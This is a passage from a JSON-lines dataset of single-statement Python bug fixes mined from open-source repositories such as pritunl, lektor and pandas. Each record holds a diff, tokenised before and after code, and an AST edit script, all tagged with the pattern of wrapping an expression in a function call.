\"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"identifier:in_id\", 3, 31, 3, 36], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "pritunl", "commit_sha": "b35d3b8133353393f1e7194d0be6f463ec83d598", "parent_sha": "88d4d16c236691fac9f57995e68248447cd7829d", "file_path": "pritunl/host/utils.py", "project_url": "https://github.com/tomzhang/pritunl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -107,7 +107,7 @@ def init():\n     else:\n         try:\n             settings.local.host.local_address = utils.get_interface_address(\n-                settings.conf.local_address_interface)\n+                str(settings.conf.local_address_interface))\n         except:\n             logger.exception('Failed to get local_address', 'host',\n                 interface=settings.conf.local_address_interface)\n", "before": "else : try : settings . local . host . local_address = utils . get_interface_address ( settings . conf . local_address_interface )", "after": "else : try : settings . local . host . local_address = utils . get_interface_address ( str ( settings . conf . local_address_interface ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"argument_list\", 2, 76, 3, 55], [\"(:(\", \"T\"], 0], [\"Insert\", [\"argument_list\", 2, 76, 3, 55], [\"call\", \"N0\"], 1], [\"Insert\", [\"argument_list\", 2, 76, 3, 55], [\"):)\", \"T\"], 2], [\"Insert\", \"N0\", [\"identifier:str\", \"T\"], 0], [\"Move\", \"N0\", [\"argument_list\", 2, 76, 3, 55], 1]]"}
{"project": "pritunl", "commit_sha": "8dbed72aede38e661fe657240baed6c977fb9bc8", "parent_sha": "5e524c12b70f97f505b9265931837926d169cf6b", "file_path": "pritunl/utils/misc.py", "project_url": "https://github.com/tomzhang/pritunl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -40,7 +40,7 @@ def now():\n     return mongo_time + (datetime.datetime.utcnow() - mongo_time_start)\n \n def time_now():\n-    return now().strftime('%s')\n+    return int(now().strftime('%s'))\n \n def rand_sleep():\n     time.sleep(random.randint(0, 25) / 1000.)\n", "before": "return now ( ) . strftime ( '%s' )", "after": "return int ( now ( ) . strftime ( '%s' ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"call\", 3, 12, 3, 32], [\"identifier:int\", \"T\"], 0], [\"Insert\", [\"call\", 3, 12, 3, 32], [\"argument_list\", \"N0\"], 1], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 12, 3, 32], 1], [\"Insert\", \"N0\", [\"):)\", \"T\"], 2]]"}
{"project": "pritunl", "commit_sha": "c3b5f6ce50116f7a66de3313f612f70aaefd1785", "parent_sha": "3a3b8d6d1ed23bb793d01adaf1a915965c335962", "file_path": "pritunl/logger/entry.py", "project_url": "https://github.com/tomzhang/pritunl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -25,7 +25,7 @@ class LogEntry(mongo.MongoObject):\n     def dict(self):\n         return {\n             'id': self.id,\n-            'timestamp': self.timestamp.strftime('%s'),\n+            'timestamp': int(self.timestamp.strftime('%s')),\n             'message': self.message,\n         }\n \n", "before": "return { 'id' : self . id , 'timestamp' : self . timestamp . strftime ( '%s' ) , 'message' : self . message , }", "after": "return { 'id' : self . id , 'timestamp' : int ( self . timestamp . strftime ( '%s' ) ) , 'message' : self . message , }", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"call\", 3, 26, 3, 55], [\"identifier:int\", \"T\"], 0], [\"Insert\", [\"call\", 3, 26, 3, 55], [\"argument_list\", \"N0\"], 1], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 26, 3, 55], 1], [\"Insert\", \"N0\", [\"):)\", \"T\"], 2]]"}
{"project": "napalm-eos", "commit_sha": "68c67e3362167fb66dc1213cf7d2c5975d060085", "parent_sha": "98866ca5f936719d407be08023e3facf08c521ff", "file_path": "napalm/eos.py", "project_url": "https://github.com/narJH27/napalm-eos", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -743,7 +743,7 @@ class EOSDriver(NetworkDriver):\n             mac_all     = mac_raw.replace('.', '').replace(':', '')\n             mac_format  = unicode(':'.join([mac_all[i:i+2] for i in range(12)[::2]]))\n             ip          = unicode(neighbor.get('address'))\n-            age         = neighbor.get('age')\n+            age         = float(neighbor.get('age'))\n             arp_table.append(\n                 {\n                     'interface' : interface,\n", "before": "age = neighbor . get ( 'age' )", "after": "age = float ( neighbor . get ( 'age' ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"call\", 3, 27, 3, 46], [\"identifier:float\", \"T\"], 0], [\"Insert\", [\"call\", 3, 27, 3, 46], [\"argument_list\", \"N0\"], 1], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 27, 3, 46], 1], [\"Insert\", \"N0\", [\"):)\", \"T\"], 2]]"}
{"project": "pritunl", "commit_sha": "c717d99a0339ad9de38be37e3edc4738d395f64e", "parent_sha": "358551fbb64f02839df681688d4516166d8c2bfc", "file_path": "pritunl/queue.py", "project_url": "https://github.com/tomzhang/pritunl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -120,7 +120,7 @@ class Queue(MongoObject):\n             for msg in messenger.subscribe(cursor_id=cursor_id,\n                     timeout=block_timeout):\n                 try:\n-                    if msg['message'] == [COMPLETE, doc['_id']]:\n+                    if msg['message'] == [COMPLETE, str(doc['_id'])]:\n                         return doc\n                 except TypeError:\n                     pass\n", "before": "if msg [ 'message' ] == [ COMPLETE , doc [ '_id' ] ] : return doc", "after": "if msg [ 'message' ] == [ COMPLETE , str ( doc [ '_id' ] ) ] : return doc", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"list\", 3, 42, 3, 64], [\"call\", \"N0\"], 3], [\"Insert\", \"N0\", [\"identifier:str\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"subscript\", 3, 53, 3, 63], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "lektor", "commit_sha": "16635554c405ac62cc527062af893a9c9f3654c2", "parent_sha": "3420053e9f20645f70491e23cfeb4b43bb6fcd6f", "file_path": "lektor/environment.py", "project_url": "https://github.com/lektor/lektor", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -95,7 +95,7 @@ def update_config_from_ini(config, inifile):\n \n     config['ATTACHMENT_TYPES'].update(\n         (k.encode('ascii', 'replace'), v.encode('ascii', 'replace'))\n-        for k, v in inifile.section_as_dict('attachment_types'))\n+        for k, v in iteritems(inifile.section_as_dict('attachment_types')))\n \n     config['PROJECT'].update(inifile.section_as_dict('project'))\n     config['PACKAGES'].update(inifile.section_as_dict('packages'))\n", "before": "config [ 'ATTACHMENT_TYPES' ] . update ( ( k . encode ( 'ascii' , 'replace' ) , v . encode ( 'ascii' , 'replace' ) ) for k , v in inifile . section_as_dict ( 'attachment_types' ) )", "after": "config [ 'ATTACHMENT_TYPES' ] . update ( ( k . encode ( 'ascii' , 'replace' ) , v . encode ( 'ascii' , 'replace' ) ) for k , v in iteritems ( inifile . section_as_dict ( 'attachment_types' ) ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"call\", 3, 21, 3, 64], [\"identifier:iteritems\", \"T\"], 0], [\"Insert\", [\"call\", 3, 21, 3, 64], [\"argument_list\", \"N0\"], 1], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 21, 3, 64], 1], [\"Insert\", \"N0\", [\"):)\", \"T\"], 2]]"}
{"project": "lektor", "commit_sha": "e689d9208df910df15178395629395a94a6044ff", "parent_sha": "4cad4a97e6a0f3b0176f72899eb7ceef035e6879", "file_path": "lektor/watcher.py", "project_url": "https://github.com/lektor/lektor", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -70,7 +70,7 @@ class Watcher(BasicWatcher):\n             return False\n         if path.startswith(self.cache_dir):\n             return False\n-        if self.output_path is not None and path.startswith(self.output_path):\n+        if self.output_path is not None and path.startswith(os.path.abspath(self.output_path)):\n             return False\n         return True\n \n", "before": "if self . output_path is not None and path . startswith ( self . output_path ) : return False", "after": "if self . output_path is not None and path . startswith ( os . path . abspath ( self . output_path ) ) : return False", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 60, 3, 78], [\"(:(\", \"T\"], 0], [\"Insert\", [\"argument_list\", 3, 60, 3, 78], [\"call\", \"N0\"], 1], [\"Insert\", [\"argument_list\", 3, 60, 3, 78], [\"):)\", \"T\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Move\", \"N0\", [\"argument_list\", 3, 60, 3, 78], 1], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:abspath\", \"T\"], 2], [\"Insert\", \"N2\", [\"identifier:os\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:path\", \"T\"], 2]]"}
{"project": "lektor", "commit_sha": "d84ebf224feeee13329f20eb8a4aa5d0a60f7fce", "parent_sha": "858f9a73e003915fb39c0fae5bff770875e2adec", "file_path": "lektor/imagetools.py", "project_url": "https://github.com/lektor/lektor", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -332,7 +332,7 @@ def get_image_info(fp):\n     if any(map(head.strip().startswith, magic_bytes)):\n         return get_svg_info(fp)\n \n-    _type = filetype.image(head)\n+    _type = filetype.image(bytearray(head))\n     fmt = _type.mime.split(\"/\")[1] if _type else None\n \n     width = None\n", "before": "_type = filetype . image ( head )", "after": "_type = filetype . image ( bytearray ( head ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 27, 3, 33], [\"(:(\", \"T\"], 0], [\"Insert\", [\"argument_list\", 3, 27, 3, 33], [\"call\", \"N0\"], 1], [\"Insert\", [\"argument_list\", 3, 27, 3, 33], [\"):)\", \"T\"], 2], [\"Insert\", \"N0\", [\"identifier:bytearray\", \"T\"], 0], [\"Move\", \"N0\", [\"argument_list\", 3, 27, 3, 33], 1]]"}
{"project": "dm_control", "commit_sha": "8dba1364fdf6bff412ff062296ea13fb95c985bf", "parent_sha": "96db220cd0c68a8d9763bc668d6d8eeaa6126588", "file_path": "dm_control/suite/wrappers/pixels_test.py", "project_url": "https://github.com/deepmind/dm_control", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -92,7 +92,7 @@ class PixelsTest(parameterized.TestCase):\n     else:\n       self.assertEqual(len(observation_spec) + 1, len(wrapped_observation_spec))\n       expected_keys = list(observation_spec.keys()) + [pixel_key]\n-      self.assertEqual(expected_keys, wrapped_observation_spec.keys())\n+      self.assertEqual(expected_keys, list(wrapped_observation_spec.keys()))\n \n     # Check that the added spec item is consistent with the added observation.\n     time_step = wrapped.reset()\n", "before": "self . assertEqual ( expected_keys , wrapped_observation_spec . keys ( ) )", "after": "self . assertEqual ( expected_keys , list ( wrapped_observation_spec . keys ( ) ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"call\", 3, 39, 3, 70], [\"identifier:list\", \"T\"], 0], [\"Insert\", [\"call\", 3, 39, 3, 70], [\"argument_list\", \"N0\"], 1], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 39, 3, 70], 1], [\"Insert\", \"N0\", [\"):)\", \"T\"], 2]]"}
{"project": "btcrelay", "commit_sha": "1acec45f12d4aa8e450152ad66705d06611fad4d", "parent_sha": "76ef04fa0eeb7cad40ba3e8a99be869d5df9ac7d", "file_path": "script/fetchd.py", "project_url": "https://github.com/Runur/btcrelay", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -32,7 +32,7 @@ def main():\n     parser.add_argument('--rpcPort', default='8545', type=int, help='RPC port')\n     # parser.add_argument('--startBlock', default=0, type=int, help='block number to start fetching from')\n     parser.add_argument('-w', '--waitFor', default=0, type=int, help='number of blocks to wait between fetches')\n-    parser.add_argument('--gasPrice', default=10e12, type=int, help='gas price')  # default 10 szabo\n+    parser.add_argument('--gasPrice', default=int(10e12), type=int, help='gas price')  # default 10 szabo\n     parser.add_argument('--fetch', action='store_true', help='fetch blockheaders')\n     parser.add_argument('-n', '--network', default=BITCOIN_TESTNET, choices=[BITCOIN_TESTNET, BITCOIN_MAINNET], help='Bitcoin network')\n     parser.add_argument('-d', '--daemon', default=False, action='store_true', help='run as daemon')\n", "before": "parser . add_argument ( '--gasPrice' , default = 10e12 , type = int , help = 'gas price' )", "after": "parser . add_argument ( '--gasPrice' , default = int ( 10e12 ) , type = int , help = 'gas price' )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 39, 3, 52], [\"call\", \"N0\"], 2], [\"Insert\", \"N0\", [\"identifier:int\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"float:10e12\", 3, 47, 3, 52], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "openstates", "commit_sha": "703d412edc41cfe54c408756113fc8bc4c15cb69", "parent_sha": "a2364a719af0d305376e2ffdeab251bdbeca35ab", "file_path": "scripts/ga/get_legislation.py", "project_url": "https://github.com/opencouncil/openstates", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -43,7 +43,7 @@ class GALegislationScraper(LegislationScraper):\n \n     @contextlib.contextmanager\n     def lxml_context(self, url):\n-        body = self.urlopen(url)\n+        body = unicode(self.urlopen(url), 'latin-1')\n         elem = lxml.html.fromstring(body)\n         try:\n             yield elem\n", "before": "body = self . urlopen ( url )", "after": "body = unicode ( self . urlopen ( url ) , 'latin-1' )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"call\", 3, 16, 3, 33], [\"identifier:unicode\", \"T\"], 0], [\"Insert\", [\"call\", 3, 16, 3, 33], [\"argument_list\", \"N0\"], 1], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 16, 3, 33], 1], [\"Insert\", \"N0\", [\",:,\", \"T\"], 2], [\"Insert\", \"N0\", [\"string:'latin-1'\", \"T\"], 3], [\"Insert\", \"N0\", [\"):)\", \"T\"], 4]]"}
{"project": "openstates", "commit_sha": "c8f40d290e40937667b65860d56f8e4326b91ab0", "parent_sha": "d8e0028995a98c640f248dac45ef22faeea3564e", "file_path": "fiftystates/scrape/me/bills.py", "project_url": "https://github.com/opencouncil/openstates", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -56,7 +56,7 @@ class MEBillScraper(BillScraper):\n                 chamber = \"upper\"\n             else:\n                 chamber = \"lower\"\n-            bill = Bill(session, chamber, bill_id, title)\n+            bill = Bill(str(session), chamber, bill_id, title)\n             bill.add_source(bill_info_url)\n \n             #Actions\n", "before": "bill = Bill ( session , chamber , bill_id , title )", "after": "bill = Bill ( str ( session ) , chamber , bill_id , title )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Move\", [\"identifier:chamber\", 3, 34, 3, 41], [\"argument_list\", 3, 24, 3, 58], 3], [\"Move\", [\"identifier:bill_id\", 3, 43, 3, 50], [\"argument_list\", 3, 24, 3, 58], 5], [\"Insert\", [\"argument_list\", 3, 24, 3, 58], [\"call\", \"N0\"], 1], [\"Insert\", [\"argument_list\", 3, 24, 3, 58], [\",:,\", \"T\"], 7], [\"Insert\", \"N0\", [\"identifier:str\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"identifier:session\", 3, 25, 3, 32], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2], [\"Delete\", [\",:,\", 3, 32, 3, 33]]]"}
{"project": "openstates", "commit_sha": "e8c0633747d39e0b35efaf7b9163fdcebe903355", "parent_sha": "cf5cf6c114b43b148d79f49bcd818b3ddf12ccf0", "file_path": "scripts/pa/get_legislation.py", "project_url": "https://github.com/opencouncil/openstates", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -225,7 +225,7 @@ class PALegislationScraper(LegislationScraper):\n         self.scrape_session(chamber, session)\n         for special in self.metadata['session_details'][session]['sub_sessions']:\n             session_num = re.search('#(\\d+)', special).group(1)\n-            self.scrape_session(chamber, session, session_num)\n+            self.scrape_session(chamber, session, int(session_num))\n \n     def scrape_legislators(self, chamber, year):\n         # Pennsylvania doesn't make member lists easily available\n", "before": "self . scrape_session ( chamber , session , session_num )", "after": "self . scrape_session ( chamber , session , int ( session_num ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 32, 3, 63], [\"call\", \"N0\"], 5], [\"Insert\", [\"argument_list\", 3, 32, 3, 63], [\"):)\", \"T\"], 6], [\"Insert\", \"N0\", [\"identifier:int\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"identifier:session_num\", 3, 51, 3, 62], 1], [\"Move\", \"N1\", [\"):)\", 3, 62, 3, 63], 2]]"}
{"project": "wristband", "commit_sha": "457c5103f5dd21969c6d07b8320c7733f1753e03", "parent_sha": "c849f978cd4dc1c55bed0a9cb35b77821c62a5ca", "file_path": "wristband/apps/providers.py", "project_url": "https://github.com/hmrc/wristband", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -100,4 +100,4 @@ class ReleaseAppDataProvider(ParentReleaseAppDataProvider):\n                 }\n                 data.append(app_to_be_added)\n                 apps_indexes[app_name] = len(data) - 1\n-        return data\n+        return sorted(data, key=lambda x: x['name'], reverse=True)\n", "before": "return data", "after": "return sorted ( data , key = lambda x : x [ 'name' ] , reverse = True )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"return_statement\", 3, 9, 3, 20], [\"call\", \"N0\"], 1], [\"Insert\", \"N0\", [\"identifier:sorted\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"identifier:data\", 3, 16, 3, 20], 1], [\"Insert\", \"N1\", [\",:,\", \"T\"], 2], [\"Insert\", \"N1\", [\"keyword_argument\", \"N2\"], 3], [\"Insert\", \"N1\", [\",:,\", \"T\"], 4], [\"Insert\", \"N1\", [\"keyword_argument\", \"N3\"], 5], [\"Insert\", \"N1\", [\"):)\", \"T\"], 6], [\"Insert\", \"N2\", [\"identifier:key\", \"T\"], 0], [\"Insert\", \"N2\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N2\", [\"lambda\", \"N4\"], 2], [\"Insert\", \"N3\", [\"identifier:reverse\", \"T\"], 0], [\"Insert\", \"N3\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N3\", [\"true:True\", \"T\"], 2], [\"Insert\", \"N4\", [\"lambda:lambda\", \"T\"], 0], [\"Insert\", \"N4\", [\"lambda_parameters\", \"N5\"], 1], [\"Insert\", \"N4\", [\":::\", \"T\"], 2], [\"Insert\", \"N4\", [\"subscript\", \"N6\"], 3], [\"Insert\", \"N5\", [\"identifier:x\", \"T\"], 0], [\"Insert\", \"N6\", [\"identifier:x\", \"T\"], 0], [\"Insert\", \"N6\", [\"[:[\", \"T\"], 1], [\"Insert\", \"N6\", [\"string:'name'\", \"T\"], 2], [\"Insert\", \"N6\", [\"]:]\", \"T\"], 3]]"}
{"project": "spyne", "commit_sha": "7baacf9b98434eceedc2c9392b044b32cd096bbf", "parent_sha": "be42e283e89315e17d900815b4f92b5172100f53", "file_path": "spyne/model/_base.py", "project_url": "https://github.com/duixteam/spyne", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -400,7 +400,7 @@ class SimpleModel(ModelBase):\n         class __metaclass__(AttributesMeta):\n             def __init__(self, cls_name, cls_bases, cls_dict):\n                 AttributesMeta.__init__(self, cls_name, cls_bases, cls_dict)\n-                self.__pattern = None\n+                self.__pattern = cls_dict.get('pattern', None)\n             def get_pattern(self):\n                 return self.__pattern\n             def set_pattern(self, pattern):\n", "before": "self . __pattern = None", "after": "self . __pattern = cls_dict . get ( 'pattern' , None )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"assignment\", 3, 17, 3, 38], [\"call\", \"N0\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N1\", [\"identifier:cls_dict\", \"T\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:get\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"string:'pattern'\", \"T\"], 1], [\"Insert\", \"N2\", [\",:,\", \"T\"], 2], [\"Move\", \"N2\", [\"none:None\", 3, 34, 3, 38], 3], [\"Insert\", \"N2\", [\"):)\", \"T\"], 4]]"}
{"project": "nitime", "commit_sha": "c3a23e11abbb68d26e1e9db2d6ab6126b0c74170", "parent_sha": "de061adbca3493c3f39eb1567f7baef839ea4fcc", "file_path": "nitime/tests/test_algorithms.py", "project_url": "https://github.com/ilustreous/nitime", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -231,7 +231,7 @@ def test_DPSS_matlab():\n     a,_ = tsa.DPSS_windows(100,2,4)\n-    b = np.loadtxt('dpss_matlab.txt')\n+    b = np.loadtxt(os.path.join(test_dir_path,'dpss_matlab.txt'))\n     npt.assert_almost_equal(a,b.T)\n         \n def test_yule_walker_AR():\n", "before": "b = np . loadtxt ( 'dpss_matlab.txt' )", "after": "b = np . loadtxt ( os . path . join ( test_dir_path , 'dpss_matlab.txt' ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"argument_list\", 1, 19, 1, 38], [\"call\", \"N0\"], 1], [\"Insert\", [\"argument_list\", 1, 19, 1, 38], [\"):)\", \"T\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N1\", [\"attribute\", \"N3\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:join\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"identifier:test_dir_path\", \"T\"], 1], [\"Insert\", \"N2\", [\",:,\", \"T\"], 2], [\"Move\", \"N2\", [\"string:'dpss_matlab.txt'\", 1, 20, 1, 37], 3], [\"Move\", \"N2\", [\"):)\", 1, 37, 1, 38], 4], [\"Insert\", \"N3\", [\"identifier:os\", \"T\"], 0], [\"Insert\", \"N3\", [\".:.\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:path\", \"T\"], 2]]"}
{"project": "pandas", "commit_sha": "280571c5da006d7602755e7a987b692e0f20dfca", "parent_sha": "e7c93c72be08d9ed0d2dd734fc7a7e1f1281547e", "file_path": "pandas/stats/ols.py", "project_url": "https://github.com/jmwoloso/pandas", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -538,7 +538,7 @@ Degrees of Freedom: model %(df_model)d, resid %(df_resid)d\n \n         f_stat = results['f_stat']\n \n-        bracketed = ['<%s>' % c for c in results['beta'].index]\n+        bracketed = ['<%s>' %str(c) for c in results['beta'].index]\n \n         formula = StringIO()\n         formula.write(bracketed[0])\n", "before": "bracketed = [ '<%s>' % c for c in results [ 'beta' ] . index ]", "after": "bracketed = [ '<%s>' % str ( c ) for c in results [ 'beta' ] . index ]", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 22, 3, 32], [\"call\", \"N0\"], 2], [\"Insert\", \"N0\", [\"identifier:str\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"identifier:c\", 3, 31, 3, 32], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "pandas", "commit_sha": "fc843d34edc5d538c9a80034d71e22e95ca08f4a", "parent_sha": "8ef921f31b6d0ebb949a79c05e7a9b6d840ab0ee", "file_path": "pandas/tests/test_frame.py", "project_url": "https://github.com/jmwoloso/pandas", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1876,7 +1876,7 @@ class CheckIndexing(object):\n             self.assertNotEqual(type(e), UnboundLocalError)\n \n     def test_reindex_methods(self):\n-        df = pd.DataFrame({'x': range(5)})\n+        df = pd.DataFrame({'x': list(range(5))})\n         target = np.array([-0.1, 0.9, 1.1, 1.5])\n \n         for method, expected_values in [('nearest', [0, 1, 1, 2]),\n", "before": "df = pd . DataFrame ( { 'x' : range ( 5 ) } )", "after": "df = pd . DataFrame ( { 'x' : list ( range ( 5 ) ) } )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"call\", 3, 33, 3, 41], [\"identifier:list\", \"T\"], 0], [\"Insert\", [\"call\", 3, 33, 3, 41], [\"argument_list\", \"N0\"], 1], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 33, 3, 41], 1], [\"Insert\", \"N0\", [\"):)\", \"T\"], 2]]"}
{"project": "openobject-client-6.0", "commit_sha": "59ff3e3e14a9ecff9b25455a1314dd2d2d161017", "parent_sha": "2abd06d7d8d66fe371b3393d5931751e6e242d85", "file_path": "bin/tools/__init__.py", "project_url": "https://github.com/hunslater/openobject-client-6.0", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -53,7 +53,7 @@ def node_attributes(node):\n \tif attrs is None:\n \t\treturn {}\n \tfor i in range(attrs.length):\n-\t\tresult[attrs.item(i).localName] = attrs.item(i).nodeValue\n+\t\tresult[attrs.item(i).localName] = str(attrs.item(i).nodeValue)\n \t\tif attrs.item(i).localName == \"digits\" and isinstance(attrs.item(i).nodeValue, (str, unicode)):\n \t\t\tresult[attrs.item(i).localName] = eval(attrs.item(i).nodeValue)\n \treturn result\n", "before": "result [ attrs . item ( i ) . localName ] = attrs . item ( i ) . nodeValue", "after": "result [ attrs . item ( i ) . localName ] = str ( attrs . item ( i ) . nodeValue )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"assignment\", 3, 3, 3, 60], [\"call\", \"N0\"], 2], [\"Insert\", \"N0\", [\"identifier:str\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"attribute\", 3, 37, 3, 60], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "openobject-client-6.0", "commit_sha": "f9951a0a351bdfdabbd17d446213b9c973f8a7ed", "parent_sha": "52d63a18c81a86117ac3479b3b3c955bdb8042f4", "file_path": "bin/widget_search/selection.py", "project_url": "https://github.com/hunslater/openobject-client-6.0", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -90,7 +90,7 @@ class selection(wid_int.wid_int):\n         operator = 'ilike'\n         if index>=0:\n             res = self._selection.get(model[index][0], False)\n-            operator = '='\n+            operator = self.attrs.get('operator','=')\n             context = tools.expr_eval(self.attrs.get('context',\"{}\"), {'self':res})\n         if res:\n", "before": "operator = '='", "after": "operator = self . attrs . get ( 'operator' , '=' )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"assignment\", 3, 13, 3, 27], [\"call\", \"N0\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N1\", [\"attribute\", \"N3\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:get\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"string:'operator'\", \"T\"], 1], [\"Insert\", \"N2\", [\",:,\", \"T\"], 2], [\"Move\", \"N2\", [\"string:'='\", 3, 24, 3, 27], 3], [\"Insert\", \"N2\", [\"):)\", \"T\"], 4], [\"Insert\", \"N3\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N3\", [\".:.\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:attrs\", \"T\"], 2]]"}
